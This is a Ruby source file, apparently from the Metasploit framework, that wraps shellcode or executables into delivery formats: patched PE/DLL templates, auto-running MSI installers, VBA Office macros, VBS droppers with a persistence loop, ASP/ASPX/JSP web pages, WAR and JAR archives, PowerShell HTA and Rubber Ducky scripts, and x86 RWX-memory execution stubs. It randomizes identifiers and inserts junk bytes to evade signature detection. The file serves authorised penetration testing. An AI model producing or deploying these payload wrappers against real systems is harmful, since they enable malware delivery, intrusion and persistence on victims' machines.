class Msf::Util::EXE::Windows::Common

  # exe_sub_method
  #
  # @param  code [String]
  # @param  opts [Hash]
  # @option opts [Symbol] :exe_type
  # @option opts [String] :service_exe
  # @option opts [Boolean] :sub_method
  # @return      [String]
  def exe_sub_method(code,opts ={})
    pe = self.get_file_contents(opts[:template])

    case opts[:exe_type]
    when :service_exe
      opts[:exe_max_sub_length] ||= 8192
      name = opts[:servicename]
      if name
        bo = pe.index('SERVICENAME')
        unless bo
          raise RuntimeError, "Invalid PE Service EXE template: missing \"SERVICENAME\" tag"
        end
        pe[bo, 11] = [name].pack('a11')
      end
      pe[136, 4] = [rand(0x100000000)].pack('V') unless opts[:sub_method]
    when :dll
      opts[:exe_max_sub_length] ||= 4096
    when :exe_sub
      opts[:exe_max_sub_length] ||= 4096
    end

    bo = self.find_payload_tag(pe, "Invalid PE EXE subst template: missing \"PAYLOAD:\" tag")

    if code.length <= opts.fetch(:exe_max_sub_length)
      pe[bo, code.length] = [code].pack("a*")
    else
      raise RuntimeError, "The EXE generator now has a max size of " +
                          "#{opts[:exe_max_sub_length]} bytes, please fix the calling module"
    end

    if opts[:exe_type] == :dll
      mt = pe.index('MUTEX!!!')
      pe[mt,8] = Rex::Text.rand_text_alpha(8) if mt
      %w{ Local\Semaphore:Default Local\Event:Default }.each do |name|
        offset = pe.index(name)
        pe[offset,26] = "Local\\#{Rex::Text.rand_text_alphanumeric(20)}" if offset
      end

      if opts[:dll_exitprocess]
        exit_thread = "\x45\x78\x69\x74\x54\x68\x72\x65\x61\x64\x00"
        exit_process = "\x45\x78\x69\x74\x50\x72\x6F\x63\x65\x73\x73"
        et_index =  pe.index(exit_thread)
        if et_index
          pe[et_index,exit_process.length] = exit_process
        else
          raise RuntimeError, "Unable to find and replace ExitThread in the DLL."
        end
      end
    end

    pe
  end

  # Clears the DYNAMIC_BASE flag for a Windows executable
  #
  # @param  exe  [String] The raw executable to be modified by the method
  # @param  pe   [Rex::PeParsey::Pe] Use Rex::PeParsey::Pe.new_from_file
  # @return      [String] the modified executable
  def clear_dynamic_base(exe, pe)
    c_bits = ("%32d" %pe.hdr.opt.DllCharacteristics.to_s(2)).split('').map { |e| e.to_i }.reverse
    c_bits[6] = 0 # DYNAMIC_BASE
    new_dllcharacteristics = c_bits.reverse.join.to_i(2)

    # PE Header Pointer offset = 60d
    # SizeOfOptionalHeader offset = 94h
    dll_ch_offset = exe[60, 4].unpack('h4')[0].reverse.hex + 94
    exe[dll_ch_offset, 2] = [new_dllcharacteristics].pack("v")
    exe
  end

  # self.set_template_default_winpe_dll
  #
  # Set the default winpe DLL template. It will select the template based on the parameters provided including the size
  # architecture and an optional flavor. See data/templates/src/pe for template source code and build tools.
  #
  # @param opts [Hash]
  # @param arch The architecture, as one the predefined constants.
  # @param size [Integer] The size of the payload.
  # @param flavor [Nil,String] An optional DLL flavor, one of 'mixed_mode' or 'dccw_gdiplus'
  private_class_method def set_template_default_winpe_dll(opts, arch, size, flavor: nil)
    return if opts[:template].present?

    # dynamic size upgrading is only available when MSF selects the template because there's currently no way to
    # determine the amount of space that is available in the template provided by the user so it's assumed to be 4KiB
    match = {4096 => '', 262144 => '.256kib'}.find { |k,v| size <= k }
    if match
      opts[:exe_max_sub_length] = match.first
      size_suffix = match.last
    end

    arch = {ARCH_X86 => 'x86', ARCH_X64 => 'x64'}.fetch(arch, nil)
    raise ArgumentError, 'The specified arch is not supported, no DLL templates are available for it.' if arch.nil?

    if flavor.present?
      unless %w[mixed_mode dccw_gdiplus].include?(flavor)
        raise ArgumentError, 'The specified flavor is not supported, no DLL templates are available for it.'
      end

      flavor = '_' + flavor
    end

    set_template_default(opts, "template_#{arch}_windows#{flavor}#{size_suffix}.dll")
  end


  # Wraps an executable inside a Windows .msi file for auto execution when run
  #
  # @param framework  [Msf::Framework]  The framework of you want to use
  # @param exe        [String]
  # @param opts       [Hash]
  # @option opts      [String] :msi_template_path
  # @option opts      [String] :msi_template
  # @return [String]
  def to_exe_msi(framework, exe, opts = {})
    if opts[:uac]
      opts[:msi_template] ||= "template_windows.msi"
    else
      opts[:msi_template] ||= "template_nouac_windows.msi"
    end
    replace_msi_buffer(exe, opts)
  end

  #self.replace_msi_buffer
  #
  # @param pe     [String]
  # @param opts   [String]
  # @option       [String] :msi_template
  # @option       [String] :msi_template_path
  # @return       [String]
  def replace_msi_buffer(pe, opts)
    opts[:msi_template_path] ||= File.join(Msf::Config.data_directory, "templates")

    if opts[:msi_template].include?(File::SEPARATOR)
      template = opts[:msi_template]
    else
      template = File.join(opts[:msi_template_path], opts[:msi_template])
    end

    msi = self.get_file_contents(template)

    section_size = 2**(msi[30..31].unpack('v')[0])

    # This table is one of the few cases where signed values are needed
    sector_allocation_table = msi[section_size..section_size*2].unpack('l<*')

    buffer_chain = []

    # This is closely coupled with the template provided and ideally
    # would be calculated from the dir stream?
    current_secid = 5

    until current_secid == -2
      buffer_chain << current_secid
      current_secid = sector_allocation_table[current_secid]
    end

    buffer_size = buffer_chain.length * section_size

    if pe.size > buffer_size
      raise RuntimeError, "MSI Buffer is not large enough to hold the PE file"
    end

    pe_block_start = 0
    pe_block_end = pe_block_start + section_size - 1

    buffer_chain.each do |section|
      block_start = section_size * (section + 1)
      block_end = block_start + section_size - 1
      pe_block = [pe[pe_block_start..pe_block_end]].pack("a#{section_size}")
      msi[block_start..block_end] = pe_block
      pe_block_start = pe_block_end + 1
      pe_block_end += section_size
    end

    msi
  end

  # to_exe_vba
  #
  # @param exes [String]
  def to_exe_vba(exes = '')
    exe = exes.unpack('C*')
    hash_sub = {}
    idx = 0
    maxbytes = 2000
    var_base_idx = 0
    var_base = Rex::Text.rand_text_alpha(5).capitalize

    # First write the macro into the vba file
    hash_sub[:var_magic] = Rex::Text.rand_text_alpha(10).capitalize
    hash_sub[:var_fname] = var_base + (var_base_idx += 1).to_s
    hash_sub[:var_fenvi] = var_base + (var_base_idx += 1).to_s
    hash_sub[:var_fhand] = var_base + (var_base_idx += 1).to_s
    hash_sub[:var_parag] = var_base + (var_base_idx += 1).to_s
    hash_sub[:var_itemp] = var_base + (var_base_idx += 1).to_s
    hash_sub[:var_btemp] = var_base + (var_base_idx += 1).to_s
    hash_sub[:var_appnr] = var_base + (var_base_idx += 1).to_s
    hash_sub[:var_index] = var_base + (var_base_idx += 1).to_s
    hash_sub[:var_gotmagic] = var_base + (var_base_idx += 1).to_s
    hash_sub[:var_farg] = var_base + (var_base_idx += 1).to_s
    hash_sub[:var_stemp] = var_base + (var_base_idx += 1).to_s
    hash_sub[:filename] = Rex::Text.rand_text_alpha(rand(8..15))

    # Function 1 extracts the binary
    hash_sub[:func_name1] = var_base + (var_base_idx += 1).to_s

    # Function 2 executes the binary
    hash_sub[:func_name2] = var_base + (var_base_idx + 1).to_s

    hash_sub[:data] = ''

    # Writing the bytes of the exe to the file
    1.upto(exe.length) do |_pc|
      while (c = exe[idx])
        hash_sub[:data] << "&H#{('%.2x' % c).upcase}"
        if idx > 1 && (idx % maxbytes) == 0
          # When maxbytes are written make a new paragrpah
          hash_sub[:data] << "\r\n"
        end
        idx += 1
      end
    end

    read_replace_script_template('to_exe.vba.template', hash_sub)
  end

  # to_vba
  #
  # @param framework  [Msf::Framework]
  # @param code       [String]
  # @param opts       [Hash]    Unused
  def to_vba(framework, code, opts = {})
    hash_sub = {}
    hash_sub[:var_myByte] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
    hash_sub[:var_myArray] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
    hash_sub[:var_rwxpage] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
    hash_sub[:var_res] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
    hash_sub[:var_offset] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
    hash_sub[:var_lpThreadAttributes] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
    hash_sub[:var_dwStackSize] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
    hash_sub[:var_lpStartAddress] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
    hash_sub[:var_lpParameter] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
    hash_sub[:var_dwCreationFlags] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
    hash_sub[:var_lpThreadID] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
    hash_sub[:var_lpAddr] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
    hash_sub[:var_lSize] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
    hash_sub[:var_flAllocationType] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
    hash_sub[:var_flProtect] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
    hash_sub[:var_lDest] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
    hash_sub[:var_Source] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
    hash_sub[:var_Length] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize

    # put the shellcode bytes into an array
    hash_sub[:bytes] = Rex::Text.to_vbapplication(code, hash_sub[:var_myArray])

    read_replace_script_template('to_mem.vba.template', hash_sub)
  end

  # to_powershell_vba
  #
  # @param framework  [Msf::Framework]
  # @param arch       [String]
  # @param code       [String]
  #
  def to_powershell_vba(framework, arch, code)
    template_path = Rex::Powershell::Templates::TEMPLATE_DIR

    powershell = Rex::Powershell::Command.cmd_psh_payload(code,
                                                          arch,
                                                          template_path,
                                                          encode_final_payload: true,
                                                          remove_comspec: true,
                                                          method: 'reflection')

    # Initialize rig and value names
    rig = Rex::RandomIdentifier::Generator.new
    rig.init_var(:sub_auto_open)
    rig.init_var(:var_powershell)

    hash_sub = rig.to_h
    # VBA has a maximum of 24 line continuations
    line_length = powershell.length / 24
    vba_psh = '"' << powershell.scan(/.{1,#{line_length}}/).join("\" _\r\n& \"") << '"'

    hash_sub[:powershell] = vba_psh

    read_replace_script_template('to_powershell.vba.template', hash_sub)
  end


  # to_exe_vba
  #
  # @param  exes  [String]
  # @param  opts  [Hash]
  # @option opts  [String] :delay
  # @option opts  [String] :persists
  # @option opts  [String] :exe_filename
  def to_exe_vbs(exes = '', opts = {})
    delay = opts[:delay] || 5
    persist = opts[:persist] || false

    hash_sub = {}
    hash_sub[:exe_filename] = opts[:exe_filename] || Rex::Text.rand_text_alpha(rand(8..15)) << '.exe'
    hash_sub[:base64_filename] = Rex::Text.rand_text_alpha(rand(8..15)) << '.b64'
    hash_sub[:var_shellcode] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_fname] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_func] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_obj] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_shell] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_tempdir] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_tempexe] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_basedir] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:base64_shellcode] = Rex::Text.encode_base64(exes)
    hash_sub[:var_decodefunc] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_xml] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_xmldoc] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_decoded] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_adodbstream] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_decodebase64] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:init] = ''

    if persist
      hash_sub[:init] << "Do\r\n"
      hash_sub[:init] << "#{hash_sub[:var_func]}\r\n"
      hash_sub[:init] << "WScript.Sleep #{delay * 1000}\r\n"
      hash_sub[:init] << "Loop\r\n"
    else
      hash_sub[:init] << "#{hash_sub[:var_func]}\r\n"
    end

    read_replace_script_template('to_exe.vbs.template', hash_sub)
  end

  # to_exe_asp
  #
  # @param exes [String]
  # @param opts [Hash]    Unused
  def to_exe_asp(exes = '', opts = {})
    hash_sub = {}
    hash_sub[:var_bytes] = Rex::Text.rand_text_alpha(rand(4..7)) # repeated a large number of times, so keep this one small
    hash_sub[:var_fname] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_func] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_stream] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_obj] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_shell] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_tempdir] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_tempexe] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_basedir] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_shellcode] = Rex::Text.to_vbscript(exes, hash_sub[:var_bytes])
    read_replace_script_template('to_exe.asp.template', hash_sub)
  end

  # self.to_exe_aspx
  #
  # @param  exes [String]
  # @option opts [Hash]
  def to_exe_aspx(exes = '', opts = {})
    hash_sub = {}
    hash_sub[:var_file] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_tempdir] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_basedir] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_filename] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_tempexe] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_iterator] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_proc] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:shellcode] = Rex::Text.to_csharp(exes, 100, hash_sub[:var_file])
    read_replace_script_template('to_exe.aspx.template', hash_sub)
  end

  def to_mem_aspx(framework, code, exeopts = {})
    # Initialize rig and value names
    rig = Rex::RandomIdentifier::Generator.new
    rig.init_var(:var_funcAddr)
    rig.init_var(:var_hThread)
    rig.init_var(:var_pInfo)
    rig.init_var(:var_threadId)
    rig.init_var(:var_bytearray)

    hash_sub = rig.to_h
    hash_sub[:shellcode] = Rex::Text.to_csharp(code, 100, rig[:var_bytearray])

    read_replace_script_template('to_mem.aspx.template', hash_sub)
  end

  def to_win32pe_psh_net(framework, code, opts = {})
    Rex::Powershell::Payload.to_win32pe_psh_net(Rex::Powershell::Templates::TEMPLATE_DIR, code)
  end

  def to_win32pe_psh(framework, code, opts = {})
    Rex::Powershell::Payload.to_win32pe_psh(Rex::Powershell::Templates::TEMPLATE_DIR, code)
  end

  #
  # Reflection technique prevents the temporary .cs file being created for the .NET compiler
  # Tweaked by shellster
  # Originally from PowerSploit
  #
  def to_win32pe_psh_reflection(framework, code, opts = {})
    Rex::Powershell::Payload.to_win32pe_psh_reflection(Rex::Powershell::Templates::TEMPLATE_DIR, code)
  end

  def to_powershell_command(framework, arch, code)
    template_path = Rex::Powershell::Templates::TEMPLATE_DIR
    Rex::Powershell::Command.cmd_psh_payload(code,
                                              arch,
                                              template_path,
                                              encode_final_payload: true,
                                              method: 'reflection')
  end

  def to_powershell_ducky_script(framework, arch, code)
    template_path = Rex::Powershell::Templates::TEMPLATE_DIR
    powershell = Rex::Powershell::Command.cmd_psh_payload(code,
                                                          arch,
                                                          template_path,
                                                          encode_final_payload: true,
                                                          method: 'reflection')
    replacers = {}
    replacers[:var_payload] = powershell
    read_replace_script_template('to_powershell.ducky_script.template', replacers)
  end

  def to_powershell_hta(framework, arch, code)
    template_path = Rex::Powershell::Templates::TEMPLATE_DIR

    powershell = Rex::Powershell::Command.cmd_psh_payload(code,
                                                          arch,
                                                          template_path,
                                                          encode_final_payload: true,
                                                          remove_comspec: true,
                                                          method: 'reflection')

    # Initialize rig and value names
    rig = Rex::RandomIdentifier::Generator.new
    rig.init_var(:var_shell)
    rig.init_var(:var_fso)

    hash_sub = rig.to_h
    hash_sub[:powershell] = powershell

    read_replace_script_template('to_powershell.hta.template', hash_sub)
  end

  def to_jsp(exe)
    hash_sub = {}
    hash_sub[:var_payload] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_exepath] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_outputstream] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_payloadlength] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_bytes] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_counter] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_exe] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_proc] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_fperm] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_fdel] = Rex::Text.rand_text_alpha(rand(8..15))
    hash_sub[:var_exepatharray] = Rex::Text.rand_text_alpha(rand(8..15))

    payload_hex = exe.unpack('H*')[0]
    hash_sub[:payload] = payload_hex

    read_replace_script_template('to_exe.jsp.template', hash_sub)
  end

  # Creates a Web Archive (WAR) file containing a jsp page and hexdump of a
  # payload.  The jsp page converts the hexdump back to a normal binary file
  # and places it in the temp directory. The payload file is then executed.
  #
  # @see to_war
  # @param exe [String] Executable to drop and run.
  # @param opts (see to_war)
  # @option opts (see to_war)
  # @return (see to_war)
  def to_jsp_war(exe, opts = {})
    template = to_jsp(exe)
    to_war(template, opts)
  end

  def to_win32pe_vbs(framework, code, opts = {})
    to_exe_vbs(to_win32pe(framework, code, opts), opts)
  end

  def to_win64pe_vbs(framework, code, opts = {})
    to_exe_vbs(to_win64pe(framework, code, opts), opts)
  end

  # Creates a jar file that drops the provided +exe+ into a random file name
  # in the system's temp dir and executes it.
  #
  # @see Msf::Payload::Java
  #
  # @return [Rex::Zip::Jar]
  def to_jar(exe, opts = {})
    spawn = opts[:spawn] || 2
    exe_name = Rex::Text.rand_text_alpha(8) + '.exe'
    zip = Rex::Zip::Jar.new
    zip.add_sub('metasploit') if opts[:random]
    paths = [
      [ 'metasploit', 'Payload.class' ],
    ]

    zip.add_file('metasploit/', '')
    paths.each do |path_parts|
      path = ['java', path_parts].flatten.join('/')
      contents = ::MetasploitPayloads.read(path)
      zip.add_file(path_parts.join('/'), contents)
    end

    zip.build_manifest main_class: 'metasploit.Payload'
    config = "Spawn=#{spawn}\r\nExecutable=#{exe_name}\r\n"
    zip.add_file('metasploit.dat', config)
    zip.add_file(exe_name, exe)

    zip
  end

  # Creates a .NET DLL which loads data into memory
  # at a specified location with read/execute permissions
  #    - the data will be loaded at: base+0x2065
  #    - default max size is 0x8000 (32768)
  # @param  base [Integer] Default location set to base 0x12340000
  # @param  data [String]
  # @param  opts [Hash]
  # @option      [String] :template
  # @option      [String] :base_offset
  # @option      [String] :timestamp_offset
  # @option      [String] :text_offset
  # @option      [String] :pack
  # @option      [String] :uuid_offset
  # @return      [String]
  def to_dotnetmem(base = 0x12340000, data = '', opts = {})
    # Allow the user to specify their own DLL template
    set_template_default(opts, 'dotnetmem.dll')

    pe = get_file_contents(opts[:template])

    # Configure the image base
    base_offset = opts[:base_offset] || 180
    pe[base_offset, 4] = [base].pack('V')

    # Configure the TimeDateStamp
    timestamp_offset = opts[:timestamp_offset] || 136
    pe[timestamp_offset, 4] = [rand(0x100000000)].pack('V')

    # XXX: Unfortunately we cant make this RWX only RX
    # Mark this segment as read-execute AND writable
    # pe[412,4] = [0xe0000020].pack("V")

    # Write the data into the .text segment
    text_offset = opts[:text_offset] || 0x1065
    text_max = opts[:text_max] || 0x8000
    pack = opts[:pack] || 'a32768'
    pe[text_offset, text_max] = [data].pack(pack)

    # Generic a randomized UUID
    uuid_offset = opts[:uuid_offset] || 37656
    pe[uuid_offset, 16] = Rex::Text.rand_text(16)

    pe
  end

  # This wrapper is responsible for allocating RWX memory, copying the
  # target code there, setting an exception handler that calls ExitProcess
  # and finally executing the code.
  def win32_rwx_exec(code)
    stub_block = Rex::Payloads::Shuffle.from_graphml_file(
      File.join(Msf::Config.install_root, 'data', 'shellcode', 'block_api.x86.graphml'),
      arch: ARCH_X86,
      name: 'api_call'
    )

    stub_exit = %^
; Input: EBP must be the address of 'api_call'.
; Output: None.
; Clobbers: EAX, EBX, (ESP will also be modified)
; Note: Execution is not expected to (successfully) continue past this block

exitfunk:
  mov ebx, #{Rex::Text.block_api_hash('kernel32.dll', 'ExitThread')}    ; The EXITFUNK as specified by user...
  push #{Rex::Text.block_api_hash('kernel32.dll', 'GetVersion')}        ; hash( "kernel32.dll", "GetVersion" )
  mov eax, ebp
  call eax               ; GetVersion(); (AL will = major version and AH will = minor version)
  cmp al, byte 6         ; If we are not running on Windows Vista, 2008 or 7
  jl goodbye             ; Then just call the exit function...
  cmp bl, 0xE0           ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, 2008 or 7...
  jne goodbye      ;
  mov ebx, #{Rex::Text.block_api_hash('ntdll.dll', 'RtlExitUserThread')}    ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThread
goodbye:                 ; We now perform the actual call to the exit function
  push byte 0            ; push the exit function parameter
  push ebx               ; push the hash of the exit function
  call ebp               ; call EXITFUNK( 0 );
^

    stub_alloc = %^
  cld                    ; Clear the direction flag.
  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
delta:                   ;
#{stub_block}
start:                   ;
  pop ebp                ; Pop off the address of 'api_call' for calling later.

allocate_size:
    mov esi, #{code.length}

allocate:
  push byte 0x40         ; PAGE_EXECUTE_READWRITE
  push 0x1000            ; MEM_COMMIT
  push esi               ; Push the length value of the wrapped code block
  push byte 0            ; NULL as we dont care where the allocation is.
  push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}        ; hash( "kernel32.dll", "VirtualAlloc" )
  call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

  mov ebx, eax           ; Store allocated address in ebx
  mov edi, eax           ; Prepare EDI with the new address
  mov ecx, esi           ; Prepare ECX with the length of the code
  call get_payload
got_payload:
  pop esi                ; Prepare ESI with the source to copy
  rep movsb              ; Copy the payload to RWX memory
  call set_handler       ; Configure error handling

exitblock:
#{stub_exit}
set_handler:
  xor eax,eax
  push dword [fs:eax]
  mov dword [fs:eax], esp
  call ebx
  jmp exitblock
^

    stub_final = %(
get_payload:
  call got_payload
payload:
; Append an arbitrary payload here
)

    stub_alloc.gsub!('short', '')
    stub_alloc.gsub!('byte', '')

    wrapper = ''
    # regs    = %W{eax ebx ecx edx esi edi ebp}

    cnt_jmp = 0
    stub_alloc.each_line do |line|
      line.gsub!(/;.*/, '')
      line.strip!
      next if line.empty?

      wrapper << "nop\n" if rand(2) == 0

      if rand(2) == 0
        wrapper << "jmp autojump#{cnt_jmp}\n"
        1.upto(rand(8..15)) do
          wrapper << "db 0x#{'%.2x' % rand(0x100)}\n"
        end
        wrapper << "autojump#{cnt_jmp}:\n"
        cnt_jmp += 1
      end
      wrapper << line + "\n"
    end

    wrapper << stub_final

    enc = Metasm::Shellcode.assemble(Metasm::Ia32.new, wrapper).encoded
    enc.data + code
  end

  # This wrapper is responsible for allocating RWX memory, copying the
  # target code there, setting an exception handler that calls ExitProcess,
  # starting the code in a new thread, and finally jumping back to the next
  # code to execute. block_offset is the offset of the next code from
  # the start of this code
  def win32_rwx_exec_thread(code, block_offset, which_offset = 'start')
    stub_block = Rex::Payloads::Shuffle.from_graphml_file(
      File.join(Msf::Config.install_root, 'data', 'shellcode', 'block_api.x86.graphml'),
      arch: ARCH_X86,
      name: 'api_call'
    )

    stub_exit = %^
; Input: EBP must be the address of 'api_call'.
; Output: None.
; Clobbers: EAX, EBX, (ESP will also be modified)
; Note: Execution is not expected to (successfully) continue past this block

exitfunk:
  mov ebx, #{Rex::Text.block_api_hash('kernel32.dll', 'ExitThread')}    ; The EXITFUNK as specified by user...
  push #{Rex::Text.block_api_hash('kernel32.dll', 'GetVersion')}        ; hash( "kernel32.dll", "GetVersion" )
  call ebp               ; GetVersion(); (AL will = major version and AH will = minor version)
  cmp al, byte 6         ; If we are not running on Windows Vista, 2008 or 7
  jl goodbye       ; Then just call the exit function...
  cmp bl, 0xE0           ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, 2008 or 7...
  jne goodbye      ;
  mov ebx, #{Rex::Text.block_api_hash('ntdll.dll', 'RtlExitUserThread')}    ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThread
goodbye:                 ; We now perform the actual call to the exit function
  push byte 0            ; push the exit function parameter
  push ebx               ; push the hash of the exit function
  call ebp               ; call EXITFUNK( 0 );
^

    stub_alloc = %^
  pushad                 ; Save registers
  cld                    ; Clear the direction flag.
  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
delta:                   ;
#{stub_block}
start:                   ;
  pop ebp                ; Pop off the address of 'api_call' for calling later.

allocate_size:
    mov esi,#{code.length}

allocate:
  push byte 0x40         ; PAGE_EXECUTE_READWRITE
  push 0x1000            ; MEM_COMMIT
  push esi               ; Push the length value of the wrapped code block
  push byte 0            ; NULL as we dont care where the allocation is.
  push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}        ; hash( "kernel32.dll", "VirtualAlloc" )
  call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

  mov ebx, eax           ; Store allocated address in ebx
  mov edi, eax           ; Prepare EDI with the new address
  mov ecx, esi           ; Prepare ECX with the length of the code
  call get_payload
got_payload:
  pop esi                ; Prepare ESI with the source to copy
  rep movsb              ; Copy the payload to RWX memory
  call set_handler       ; Configure error handling

exitblock:
#{stub_exit}

set_handler:
  xor eax,eax
;     push dword [fs:eax]
;     mov dword [fs:eax], esp
  push eax               ; LPDWORD lpThreadId (NULL)
  push eax               ; DWORD dwCreationFlags (0)
  push eax               ; LPVOID lpParameter (NULL)
  push ebx               ; LPTHREAD_START_ROUTINE lpStartAddress (payload)
  push eax               ; SIZE_T dwStackSize (0 for default)
  push eax               ; LPSECURITY_ATTRIBUTES lpThreadAttributes (NULL)
  push #{Rex::Text.block_api_hash('kernel32.dll', 'CreateThread')}        ; hash( "kernel32.dll", "CreateThread" )
  call ebp               ; Spawn payload thread

  pop eax                ; Skip
;     pop eax                ; Skip
  pop eax                ; Skip
  popad                  ; Get our registers back
;     sub esp, 44            ; Move stack pointer back past the handler
^

    stub_final = %(
get_payload:
  call got_payload
payload:
; Append an arbitrary payload here
)

    stub_alloc.gsub!('short', '')
    stub_alloc.gsub!('byte', '')

    wrapper = ''
    # regs    = %W{eax ebx ecx edx esi edi ebp}

    cnt_jmp = 0
    cnt_nop = 64

    stub_alloc.each_line do |line|
      line.gsub!(/;.*/, '')
      line.strip!
      next if line.empty?

      if cnt_nop > 0 && rand(4) == 0
        wrapper << "nop\n"
        cnt_nop -= 1
      end

      if cnt_nop > 0 && rand(16) == 0
        cnt_nop -= 2
        cnt_jmp += 1

        wrapper << "jmp autojump#{cnt_jmp}\n"
        1.upto(rand(1..8)) do
          wrapper << "db 0x#{'%.2x' % rand(0x100)}\n"
          cnt_nop -= 1
        end
        wrapper << "autojump#{cnt_jmp}:\n"
      end
      wrapper << line + "\n"
    end

    # @TODO: someone who knows how to use metasm please explain the right way to do this.
    wrapper << "db 0xe9\n db 0xFF\n db 0xFF\n db 0xFF\n db 0xFF\n"
    wrapper << stub_final

    enc = Metasm::Shellcode.assemble(Metasm::Ia32.new, wrapper).encoded
    soff = enc.data.index("\xe9\xff\xff\xff\xff") + 1
    res = enc.data + code

    if which_offset == 'start'
      res[soff, 4] = [block_offset - (soff + 4)].pack('V')
    elsif which_offset == 'end'
      res[soff, 4] = [res.length - (soff + 4) + block_offset].pack('V')
    else
      raise 'Blast! Msf::Util::EXE.rwx_exec_thread called with invalid offset!'
    end
    res
  end
end